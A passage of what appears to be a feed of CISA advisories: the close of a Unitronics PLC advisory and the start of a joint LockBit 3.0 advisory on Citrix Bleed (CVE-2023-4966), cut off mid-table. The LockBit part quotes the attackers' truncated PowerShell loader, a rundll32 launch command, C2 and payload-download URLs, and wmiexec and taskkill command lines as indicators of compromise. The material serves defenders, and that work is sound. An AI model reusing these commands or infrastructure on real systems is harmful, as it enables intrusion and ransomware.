weaknesses, including poor password security and exposure to the internet. To safeguard against this threat, the authoring agencies urge organizations to consider the following:</p>\n<p><strong>Immediate steps to prevent attack:</strong></p>\n<ul><li><strong><em>(Updated December 14, 2023)</em> </strong>Upgrade devices to 9.9.00 VisiLogic software, which requires users to change the default passwords on PLCs and HMIs. Use a strong password. For more information, see Unitronics’ blog <a href=\"https://www.unitronicsplc.com/cyber_security_vision-samba/\" title=\"Unitronics Cybersecurity for Vision and Samba PLC Series\">Unitronics Cybersecurity for Vision and Samba PLC Series</a> and <a href=\"https://downloads.unitronicsplc.com/Sites/plc/Visilogic/Version_Changes-Bug_Reports/VisiLogic%209.9.00%20Version%20changes.pdf\" title=\"VisiLogic 9.9.00\">Release notes for VisiLogic 9.9.00</a>.</li>\n<li>Disconnect the PLC from the public-facing internet.</li>\n</ul><p><strong>Follow-on steps to strengthen your security posture:</strong></p>\n<ul><li>Implement multifactor authentication for access to the operational technology (OT) network whenever applicable.</li>\n<li>If you require remote access, implement a firewall and/or virtual private network (VPN) in front of the PLC to control network access. A VPN or gateway device can enable multifactor authentication for remote access even if the PLC does not support multifactor authentication.</li>\n<li>Create strong backups of the logic and configurations of PLCs to enable fast recovery. Familiarize yourself with factory resets and backup deployment as preparation in the event of ransomware activity.</li>\n<li>Keep your Unitronics and other PLC devices updated with the latest versions by the manufacturer.</li>\n<li>Confirm third-party vendors are applying the above recommended countermeasures to mitigate exposure of these devices and all installed equipment.</li>\n</ul><p>In addition, the authoring agencies recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques, and to reduce the impact and risk of compromise by cyber threat actors:</p>\n<ul><li><strong>Reduce risk exposure. </strong>CISA offers a range of services at no cost, including scanning and testing to help organizations reduce exposure to threats via mitigating attack vectors. <a href=\"https://www.cisa.gov/topics/cyber-threats-and-advisories/cyber-hygiene-services\" title=\"Cyber Resource Hub\">CISA Cyber Hygiene</a> services can help provide additional review of organizations’ internet-accessible assets. Email <a href=\"mailto:vulnerability@cisa.dhs.gov\" title=\"Vulnerability | CISA\">vulnerability@cisa.dhs.gov</a> with the subject line, “Requesting Cyber Hygiene Services” to get started.</li>\n</ul><h4><strong>Device Manufacturers</strong></h4>\n<p>Although critical infrastructure organizations using Unitronics (including rebranded Unitronics) PLC devices can take steps to mitigate the risks, it is ultimately the responsibility of the device manufacturer to build products that are secure by design and default. The authoring agencies urge device manufacturers to take ownership of the security outcomes of their customers by following the principles in the joint guide <a href=\"https://www.cisa.gov/resources-tools/resources/secure-by-design\" title=\"Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software\">Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software</a>, primarily:</p>\n<ul><li>Do not ship products with default passwords. Instead, either ship products with random initial passwords or require users to change the password upon first use.</li>\n<li><a href=\"/sites/default/files/2023-11/SbD%20Alert%20-%20How%20Software%20Manufacturers%20Can%20Shield%20Web%20Management%20Interfaces%20From%20Malicious%20Cyber%20Activity_508c%20%281%29_0.pdf\" title=\"Secure by Design Alert - How Software Manufacturers Can Shield Web Management Interfaces from Malicious Cyber Activity\">Do not expose administrative interfaces to the internet by default</a>, and take steps to introduce friction should a device be placed in an insecure state.</li>\n</ul><ul><li>Do not charge extra for basic security features needed to operate the product securely.</li>\n<li>Support multifactor authentication, including via phishing-resistant methods.</li>\n</ul><p>By using secure by design tactics, software manufacturers can make their product lines secure “out of the box” without requiring customers to spend additional resources making configuration changes, purchasing tiered security software and logs, monitoring, and making routine updates.</p>\n<p>For more information on common misconfigurations and guidance on reducing their prevalence, see joint advisory <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-278a\" title=\"NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations\">NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations</a>. For more information on secure by design, see CISA’s <a href=\"https://www.cisa.gov/securebydesign\" title=\"Secure by Design\">Secure by Design and Default</a> webpage and joint guide.</p>\n<h3><strong>VALIDATE SECURITY CONTROLS</strong></h3>\n<p>In addition to applying mitigations, the authoring agencies recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. The authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>\n<p>To get started:</p>\n<ol><li>Select an ATT&amp;CK technique described in this advisory (see Table 2).</li>\n<li>Align your security technologies against the technique.</li>\n<li>Test your technologies against the technique.</li>\n<li>Analyze your detection and prevention technologies’ performance.</li>\n<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>\n<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>\n</ol><p>The authoring agencies recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>\n<h3><strong>RESOURCES</strong></h3>\n<ul><li><a href=\"https://www.epa.gov/waterresilience/epa-cybersecurity-water-sector\" title=\"EPA Cybersecurity for the Water Sector\">EPA: Cybersecurity for the Water Sector</a></li>\n<li><a href=\"https://www.cisa.gov/water\" title=\"Water and Wastewater Cybersecurity\">CISA: Water and Wastewater Systems Sector</a></li>\n<li><a href=\"https://www.cisa.gov/news-events/alerts/2023/11/28/exploitation-unitronics-plcs-used-water-and-wastewater-systems\" title=\"Exploitation of Unitronics PLCs used in Water and Wastewater Systems\">CISA Alert: Exploitation of Unitronics PLCs used in Water and Wastewater Systems</a></li>\n<li><a href=\"https://www.cisa.gov/topics/cyber-threats-and-advisories/advanced-persistent-threats/iran\" title=\"Iran Cyber Threat Overview and Advisories\">CISA: Iran Cyber Threat Overview and Advisories</a></li>\n<li><a href=\"https://www.fbi.gov/investigate/counterintelligence/the-iran-threat\" title=\"The Iran Threat\">FBI: The Iran Threat - Web Page</a></li>\n<li><a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK Mapping\">CISA, MITRE: Best Practices for MITRE ATT&amp;CK Mapping</a></li>\n<li><a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\">CISA: Decider Tool</a></li>\n<li><a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">CISA: Cross-Sector Cybersecurity Performance Goals</a></li>\n<li><a href=\"https://www.cisa.gov/cyber-resource-hub\" title=\"Cyber Resource Hub\">CISA: Cyber Hygiene Services</a></li>\n<li><a href=\"https://www.cisa.gov/resources-tools/resources/secure-by-design\" title=\"Shifting the Balance of Cybersecurity Risk - Principles and Approaches for Secure by Design Software\">CISA: Shifting the Balance of Cybersecurity Risk - Principles and Approaches for Secure by Design Software</a></li>\n<li><a href=\"/sites/default/files/2023-11/SbD%20Alert%20-%20How%20Software%20Manufacturers%20Can%20Shield%20Web%20Management%20Interfaces%20From%20Malicious%20Cyber%20Activity_508c%20%281%29_0.pdf\" title=\"Secure by Design Alert - How Software Manufacturers Can Shield Web Management Interfaces from Malicious Cyber Activity\">CISA: Secure by Design Alert - How Software Manufacturers Can Shield Web Management Interfaces from Malicious Cyber Activity</a></li>\n<li><a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-278a\" title=\"NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations\">CISA, NSA: NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations</a></li>\n<li><a href=\"https://www.cisa.gov/securebydesign\" title=\"Secure by Design\">CISA: Secure by Design and Default</a></li>\n</ul><h3><strong>REPORTING</strong></h3>\n<p>All organizations should report suspicious or criminal activity related to information in this CSA to CISA via CISA’s 24/7 Operations Center (<a href=\"mailto:report@cisa.gov\">report@cisa.gov</a> or 888-282-0870). The FBI encourages recipients of this document to report information concerning suspicious or criminal activity to their <a href=\"http://www.fbi.gov/contact-us/field-offices\" title=\"Field Office\">local FBI field office</a> or <a href=\"https://www.ic3.gov/\" title=\"Internet Crime Complaint Center (IC3)\">IC3.gov</a>. For NSA client requirements or general cybersecurity inquiries, contact <a href=\"mailto:Cybersecurity_Requests@nsa.gov\" title=\"Cybersecurity Requests | NSA\">Cybersecurity_Requests@nsa.gov</a>.</p>\n<p>Additionally, the WaterISAC encourages members to share information by emailing <a href=\"mailto:analyst@waterisac.org\" target=\"_blank\" title=\"Analyst | WaterISAC\">analyst@waterisac.org</a>, calling 866-H2O-ISAC, or using the <a href=\"https://www.waterisac.org/report-incident\" target=\"_blank\" title=\"CONFIDENTIAL INCIDENT REPORTING FORM\">online incident reporting form</a>. State, local, tribal, and territorial governments should report incidents to the MS-ISAC (<a href=\"mailto:SOC@cisecurity.org\" title=\"SOC | CIS Security\">SOC@cisecurity.org</a> or 866-787-4722).</p>\n<h3><strong>REFERENCES</strong></h3>\n<ol><li><a href=\"https://www.cbsnews.com/pittsburgh/news/municipal-water-authority-of-aliquippa-hacked-iranian-backed-cyber-group/\" title=\"Municipal Water Authority of Aliquippa hacked by Iranian-backed cyber group\">CBS News: Municipal Water Authority of Aliquippa hacked by Iranian-backed cyber group</a></li>\n<li><a href=\"https://industrialcyber.co/analysis/digital-battlegrounds-evolving-hybrid-kinetic-warfare/\" title=\"Digital Battlegrounds: Evolving Hybrid Kinetic Warfare\">Industrial Cyber: Digital Battlegrounds - Evolving Hybrid Kinetic Warfare</a></li>\n<li><a href=\"https://www.bleepingcomputer.com/news/security/israels-largest-oil-refinery-website-offline-after-ddos-attack/\" title=\"Israel's largest oil refinery website offline after DDoS attack\">Bleeping Computer: Israel's Largest Oil Refinery Website Offline After DDoS Attack</a></li>\n<li><a href=\"https://www.darkreading.com/cyberattacks-data-breaches/israeli-oil-refinery-taken-offline-pro-iranian-attackers\" title=\"Website of Israeli Oil Refinery Taken Offline by Pro-Iranian Attackers\">Dark Reading: Website of Israeli Oil Refinery Taken Offline by Pro-Iranian Attackers</a></li>\n<li><a href=\"https://twitter.com/CyberAveng3rs/status/1718970041616543922\" title=\"CyberAveng3rs\">X: @CyberAveng3rs</a></li>\n</ol><h3><strong>DISCLAIMER</strong></h3>\n<p>The information in this report is being provided “as is” for informational purposes only. The authoring agencies do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the authoring agencies.</p>\n<h3><strong>VERSION HISTORY</strong></h3>\n<p>December 1, 2023: Initial version.<br />\nDecember 14, 2023: Added CVE, patch information, and IOC descriptions.</p>\n","pubDate":"Fri, 01 Dec 2023 17:21:58 EST","dc:creator":"CISA","guid":{"@isPermaLink":"false","#text":"/node/20411"}},{"title":"#StopRansomware: LockBit 3.0 Ransomware Affiliates Exploit CVE 2023-4966 Citrix Bleed Vulnerability","link":"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-325a","description":"<h3>SUMMARY</h3>\n<p><em><strong>Note:</strong> This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit </em><a href=\"https://www.cisa.gov/stopransomware\" title=\"#StopRansomware\"><em>stopransomware.gov</em></a><em> to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.</em></p>\n<p>The Cybersecurity and Infrastructure Security Agency (CISA), Federal Bureau of Investigation (FBI), Multi-State Information Sharing &amp; Analysis Center (MS-ISAC), and Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC) are releasing this joint Cybersecurity Advisory (CSA) to disseminate IOCs, TTPs, and detection methods associated with LockBit 3.0 ransomware exploiting CVE-2023-4966, labeled Citrix Bleed, affecting Citrix NetScaler web application delivery control (ADC) and NetScaler Gateway appliances.</p>\n<p>This CSA provides TTPs and IOCs obtained from FBI, ACSC, and voluntarily shared by Boeing. Boeing observed LockBit 3.0 affiliates exploiting CVE-2023-4966, to obtain initial access to Boeing Distribution Inc., its parts and distribution business that maintains a separate environment. Other trusted third parties have observed similar activity impacting their organization.</p>\n<p>Historically, LockBit 3.0 affiliates have conducted attacks against organizations of varying sizes across multiple critical infrastructure sectors, including education, energy, financial services, food and agriculture, government and emergency services, healthcare, manufacturing, and transportation. Observed TTPs for LockBit ransomware attacks can vary significantly in observed TTPs.</p>\n<p>Citrix Bleed, known to be leveraged by LockBit 3.0 affiliates, allows threat actors to bypass password requirements and multifactor authentication (MFA), leading to successful session hijacking of legitimate user sessions on Citrix NetScaler web application delivery control (ADC) and Gateway appliances. Through the takeover of legitimate user sessions, malicious actors acquire elevated permissions to harvest credentials, move laterally, and access data and resources.</p>\n<p>CISA and the authoring organizations strongly encourage network administrators to apply the mitigations found in this CSA, which include isolating NetScaler ADC and Gateway appliances and applying necessary software updates through the <a href=\"https://support.citrix.com/article/CTX579459/netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve20234966-and-cve20234967\" title=\"NetScaler ADC and NetScaler Gateway Security Bulletin for CVE-2023-4966 and CVE-2023-4967\">Citrix Knowledge Center</a>.</p>\n<p>The authoring organizations encourage network defenders to hunt for malicious activity on their networks using the detection methods and IOCs within this CSA. If a potential compromise is detected, organizations should apply the incident response recommendations. If no compromise is detected, organizations should immediately apply patches made publicly available.</p>\n<p>For the associated Malware Analysis Report (MAR), see: <a href=\"https://www.cisa.gov/news-events/analysis-reports/ar23-325a\" title=\"MAR-10478915-1.v1 Citrix Bleed\">MAR-10478915-1.v1 Citrix Bleed</a></p>\n<p>Download the PDF version of this report:</p>\n\n\n\n\n\n<div class=\"c-file\">\n    <div class=\"c-file__download\">\n    <a href=\"/sites/default/files/2023-11/aa23-325a_lockbit_3.0_ransomware_affiliates_exploit_cve-2023-4966_citrix_bleed_vulnerability_0.pdf\" class=\"c-file__link\" target=\"_blank\">AA23-325A LockBit 3.0 Ransomware Affiliates Exploit CVE 2023-4966 Citrix Bleed Vulnerability</a>\n    <span class=\"c-file__size\">(PDF,       631.83 KB\n  )</span>\n  </div>\n</div>\n<p>For a downloadable copy of IOCs, see:</p>\n\n\n\n\n\n<div class=\"c-file\">\n    <div class=\"c-file__download\">\n    <a href=\"/sites/default/files/2023-11/AA23-325A.stix_.xml\" class=\"c-file__link\" target=\"_blank\">AA23-325A STIX XML</a>\n    <span class=\"c-file__size\">(XML,       29.22 KB\n  )</span>\n  </div>\n</div>\n\n\n\n\n\n<div class=\"c-file\">\n    <div class=\"c-file__download\">\n    <a href=\"/sites/default/files/2023-11/AA23-325A%20Citrix%20Bleed%20Lockbit%20Ransomware%20Exploit%20CVE%202023-4966.stix_.json\" class=\"c-file__link\" target=\"_blank\">AA23-325A STIX JSON</a>\n    <span class=\"c-file__size\">(JSON,       23.00 KB\n  )</span>\n  </div>\n</div>\n<h3>TECHNICAL DETAILS</h3>\n<p><strong>Note:</strong> <em>This advisory uses the </em><a href=\"https://attack.mitre.org/versions/v14/matrices/enterprise/\" title=\"Enterprise Matrix\"><em>MITRE ATT&amp;CK® for Enterprise</em></a><em> framework, version 14. See the MITRE ATT&amp;CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&amp;CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s </em><a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK Mapping\"><em>Best Practices for MITRE ATT&amp;CK Mapping</em></a><em> and CISA’s </em><a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\"><em>Decider Tool</em></a>.</p>\n<h4><strong>CVE-2023-4966</strong></h4>\n<p>CVE-2023-4966 is a software vulnerability found in Citrix NetScaler ADC and NetScaler Gateway appliances with exploitation activity identified as early as August 2023. This vulnerability provides threat actors, including LockBit 3.0 ransomware affiliates, the capability to bypass MFA [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1556/006/\" title=\"Modify Authentication Process: Multi-Factor Authentication\">T1556.006</a>] and hijack legitimate user sessions [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1563/\" title=\"Remote Service Session Hijacking\">T1563</a>].</p>\n<p>After acquiring access to valid cookies, LockBit 3.0 affiliates establish an authenticated session within the NetScaler appliance without a username, password, or access to MFA tokens [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1539/\" title=\"Steal Web Session Cookie\">T1539</a>]. Affiliates acquire this by sending an HTTP GET request with a crafted HTTP Host header, leading to a vulnerable appliance returning system memory information [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1082/\" title=\"System Information Discovery\">T1082</a>]. The information obtained through this exploit contains a valid NetScaler AAA session cookie.</p>\n<p>Citrix publicly disclosed CVE-2023-4966 on Oct. 10, 2023, within their <a href=\"https://support.citrix.com/article/CTX579459/netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve20234966-and-cve20234967\" title=\"NetScaler ADC and NetScaler Gateway Security Bulletin for CVE-2023-4966 and CVE-2023-4967\">Citrix Security Bulletin</a>, which issued guidance, and detailed the affected products, IOCs, and recommendations. Based on widely available public exploits and evidence of active exploitation, CISA added this vulnerability to the <a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\">Known Exploited Vulnerabilities (KEVs) Catalog</a>. This critical vulnerability exploit impacts the following software versions [<a href=\"https://support.citrix.com/article/CTX579459/netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve20234966-and-cve20234967\" title=\"NetScaler ADC and NetScaler Gateway Security Bulletin for CVE-2023-4966 and CVE-2023-4967\">1</a>]:</p>\n<ul><li>NetScaler ADC and NetScaler Gateway 14.1 before 14.1-8.50</li>\n<li>NetScaler ADC and NetScaler Gateway 13.1 before 13.1-49.15</li>\n<li>NetScaler ADC and NetScaler Gateway 13.0 before 13.0-92.19</li>\n<li>NetScaler ADC and NetScaler Gateway version 12.1 (EOL)</li>\n<li>NetScaler ADC 13.1FIPS before 13.1-37.163</li>\n<li>NetScaler ADC 12.1-FIPS before 12.1-55.300</li>\n<li>NetScaler ADC 12.1-NDcPP before 12.1-55.300</li>\n</ul><p>Due to the ease of exploitation, CISA and the authoring organizations expect to see widespread exploitation of the Citrix vulnerability in unpatched software services throughout both private and public networks.</p>\n<h4><strong>Threat Actor Activity</strong></h4>\n<p>Malware identified in this campaign is generated beginning with the execution of a PowerShell script (<code>123.ps1</code>) which concatenates two base64 strings together, converts them to bytes, and writes them to the designated file path.</p>\n<table class=\"MsoTableGrid\"><tbody><tr><td>\n<p>$y = \"TVqQAAMA...&lt;long base64 string&gt;\"<br />\n\t\t\t$x = \"RyEHABFQ...&lt;long base64 string&gt;\"<br />\n\t\t\t$filePath = \"C:\\Users\\Public\\adobelib.dll\"<br />\n\t\t\t$fileBytes = [System.Convert]::FromBase64String($y + $x)<br />\n\t\t\t[System.IO.File]::WriteAllBytes($filePath, $fileBytes)</p>\n</td>\n</tr></tbody></table><p>The resulting file (<code>adobelib.dll</code>) is then executed by the PowerShell script using <code>rundll32</code>.</p>\n<p><code>rundll32 C:\\Users\\Public\\adobelib.dll,main &lt;104 hex char key&gt;</code></p>\n<p>The Dynamic Link Library (DLL) will not execute correctly without the 104 hex character key. Following execution, the DLL attempts to send a POST request to https://adobe-us-updatefiles[.]digital/index.php which resolves to IP addresses 172.67.129[.]176 and 104.21.1[.]180 as of November 16, 2023. Although adobelib.dll and the adobe-us-updatefiles[.]digital have the appearance of legitimacy, the file and domain have no association with legitimate Adobe software and no identified interaction with the software.</p>\n<p>Other observed activities include the use of a variety of TTPs commonly associated with ransomware activity. For example, LockBit 3.0 affiliates have been observed using AnyDesk and Splashtop remote management and monitoring (RMM), Batch and PowerShell scripts, the execution of HTA files using the Windows native utility mshta.exe and other common software tools typically associated with ransomware incidents.</p>\n<h3>INDICATORS OF COMPROMISE (IOCS)</h3>\n<p>See Table 1–Table 5 for IOCs related to Lockbit 3.0 affiliate exploitation of CVE-2023-4966.</p>\n<h5><strong>[Fidelity] Legend:</strong></h5>\n<ul><li>High = Indicator is unique or highly indicates LockBit in an environment.</li>\n<li>Medium = Indicator was used by LockBit but is used outside of LockBit activity, albeit rarely.</li>\n<li>Low = Indicates tools that are commonly used but were used by LockBit.</li>\n</ul><p>Low confidence indicators may not be related to ransomware.</p>\n<p><strong><em>Disclaimer: </em></strong><em>Some IP addresses in this CSA may be associated with legitimate activity. Organizations are encouraged to investigate the activity around these IP addresses prior to taking action, such as blocking. Activity should not be attributed as malicious without analytical evidence to support they are used at the direction of, or controlled by, threat actors.</em></p>\n<table class=\"MsoTableGrid tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 1: LockBit 3.0 Affiliate Citrix Bleed Campaign</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Indicator</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Type</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Fidelity</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Description</strong></p>\n</th>\n</tr></thead><tbody><tr><td>\n<p>192.229.221[.]95</p>\n</td>\n<td>\n<p>IP</p>\n</td>\n<td>\n<p>Low</p>\n</td>\n<td>\n<p><code>Mag.dll</code> calls out to this IP address. Ties back to <code>dns0.org</code>. Should run this DLL in a sandbox, when possible, to confirm C2. IP is shared hosting.</p>\n</td>\n</tr><tr><td>\n<p>123.ps1</p>\n</td>\n<td>\n<p>PowerShell script</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>Creates and executes payload via script.</p>\n</td>\n</tr><tr><td>\n<p>193.201.9[.]224</p>\n</td>\n<td>\n<p>IP</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>FTP to Russian geolocated IP from compromised system.</p>\n</td>\n</tr><tr><td>\n<p>62.233.50[.]25</p>\n</td>\n<td>\n<p>IP</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>Russian geolocated IP from compromised system.</p>\n<p>Hxxp://62.233.50[.]25/en-us/docs.html</p>\n<p>Hxxp://62.233.50[.]25/en-us/test.html</p>\n</td>\n</tr><tr><td>\n<p>51.91.79[.].17</p>\n</td>\n<td>\n<p>IP</p>\n</td>\n<td>\n<p>Med</p>\n</td>\n<td>\n<p><code>Temp.sh</code> IP.</p>\n</td>\n</tr><tr><td>\n<p>Teamviewer</p>\n</td>\n<td>\n<p>Tool (Remote Admin)</p>\n</td>\n<td>\n<p>Low</p>\n</td>\n<td>\n<p> </p>\n</td>\n</tr><tr><td>\n<p>70.37.82[.]20</p>\n</td>\n<td>\n<p>IP</p>\n</td>\n<td>\n<p>Low</p>\n</td>\n<td>\n<p>IP was seen from a known compromised account reaching out to an Altera IP address. LockBit is known to leverage Altera, a remote admin tool, such as Anydesk, team viewer, etc.</p>\n</td>\n</tr><tr><td>\n<p>185.17.40[.]178</p>\n</td>\n<td>\n<p>IP</p>\n</td>\n<td>\n<p>Low</p>\n</td>\n<td>\n<p>Teamviewer C2, ties back to a polish service provider, Artnet Sp. Zo.o. Polish IP address.</p>\n</td>\n</tr></tbody></table><table class=\"MsoTableGrid tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 2: LockBit 3.0 Affiliate Citrix Bleed Campaign</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Indicator</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Type</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Fidelity</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Description</strong></p>\n</th>\n</tr></thead><tbody><tr><td>\n<p>185.229.191.41</p>\n</td>\n<td>\n<p>Anydesk Usage</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>Anydesk C2.</p>\n</td>\n</tr><tr><td>\n<p>81.19.135[.]219</p>\n</td>\n<td>\n<p>IP</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>Russian geolocated IP hxxp://81.19.135[.]219/F8PtZ87fE8dJWqe.hta</p>\n<p>Hxxp://81.19.135[.]219:443/q0X5wzEh6P7.hta</p>\n</td>\n</tr><tr><td>\n<p>45.129.137[.]233</p>\n</td>\n<td>\n<p>IP</p>\n</td>\n<td>\n<p>Medium</p>\n</td>\n<td>\n<p>Callouts from known compromised device beginning during the compromised window.</p>\n</td>\n</tr><tr><td>\n<p>185.229.191[.]41</p>\n</td>\n<td>\n<p>Anydesk Usage</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>Anydesk C2.</p>\n</td>\n</tr><tr><td>\n<p>Plink.exe</p>\n</td>\n<td>\n<p>Command interpreter</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>Plink (PuTTY Link) is a command-line connection tool, similar to UNIX SSH. It is mostly used for automated operations, such as making CVS access a repository on a remote server. Plink can be used to automate SSH actions and for remote SSH tunneling on Windows.</p>\n</td>\n</tr><tr><td>\n<p>AnyDeskMSI.exe</p>\n</td>\n<td>\n<p>Remote admin tool</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>We do see that AnyDeskMSI.exe was installed as a service with “auto start” abilities for persistence. Config file from the image could be leveraged to find the ID and Connection IP, but we do not have that currently.</p>\n</td>\n</tr><tr><td>\n<p>SRUtility.exe</p>\n</td>\n<td>\n<p>Splashtop utility</p>\n</td>\n<td>\n<p> </p>\n</td>\n<td>\n<p>9b6b722ba4a691a2fe21747cd5b8a2d18811a173413d4934949047e04e40b30a</p>\n</td>\n</tr><tr><td>\n<p>Netscan exe</p>\n</td>\n<td>\n<p>Network scanning software</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>498ba0afa5d3b390f852af66bd6e763945bf9b6bff2087015ed8612a18372155</p>\n</td>\n</tr></tbody></table><table class=\"MsoTableGrid tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 3: LockBit 3.0 Affiliate Citrix Bleed Campaign</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Indicator</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Type</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Fidelity</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Description</strong></p>\n</th>\n</tr></thead><tbody><tr><td>\n<p>Scheduled task:</p>\n<p>\\MEGA\\MEGAcmd</p>\n</td>\n<td>\n<p>Persistence</p>\n<p> </p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p> </p>\n</td>\n</tr><tr><td>\n<p>Scheduled task:</p>\n<p>UpdateAdobeTask</p>\n</td>\n<td>\n<p>Persistence</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p> </p>\n</td>\n</tr><tr><td>\n<p>Mag.dll</p>\n</td>\n<td>\n<p>Persistence</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>Identified as running within UpdateAdobeTask <code>cc21c77e1ee7e916c9c48194fad083b2d4b2023df703e544ffb2d6a0bfc90a63</code>.</p>\n</td>\n</tr><tr><td>\n<p>123.ps1</p>\n</td>\n<td>\n<p>Script</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>Creates <code>rundll32 C:\\Users\\Public\\adobelib.dll,main ed5d694d561c97b4d70efe934936286fe562addf7d6836f795b336d9791a5c44</code>.</p>\n</td>\n</tr><tr><td>\n<p>Adobelib.dll</p>\n</td>\n<td>\n<p>Persistence</p>\n</td>\n<td>\n<p>Low</p>\n</td>\n<td>\n<p>C2 from <code>adobelib.dll</code>.</p>\n</td>\n</tr><tr><td>\n<p>Adobe-us-updatefiles[.]digital</p>\n</td>\n<td>\n<p>Tool Download</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>Used to download obfuscated toolsets.</p>\n</td>\n</tr><tr><td>\n<p>172.67.129[.]176</p>\n</td>\n<td>\n<p>Tool Download</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>IP of adobe-us-updatefiles[.]digital.</p>\n</td>\n</tr><tr><td>\n<p>104.21.1[.]180</p>\n</td>\n<td>\n<p>Tool Download</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>Adobe-us-updatefiles[.]digital.</p>\n</td>\n</tr><tr><td>\n<p>cmd.exe /q /c cd 1&gt; \\\\127.0.0.1\\admin$\\__1698617793[.]44 2&gt;&amp;1</p>\n</td>\n<td>\n<p>Command</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>wmiexec.exe usage</p>\n</td>\n</tr><tr><td>\n<p>cmd.exe /q /c cd \\ 1&gt; \\\\127.0.0.1\\admin$\\__1698617793[.]44 2&gt;&amp;1</p>\n</td>\n<td>\n<p>Command</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>wmiexec.exe usage</p>\n</td>\n</tr><tr><td>\n<p>cmd.exe /q /c query user 1&gt; \\\\127.0.0.1\\admin$\\__1698617793[.]44 2&gt;&amp;1</p>\n</td>\n<td>\n<p>Command</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>wmiexec.exe usage</p>\n</td>\n</tr><tr><td>\n<p>cmd.exe /q /c taskkill /f /im sqlwriter.exe /im 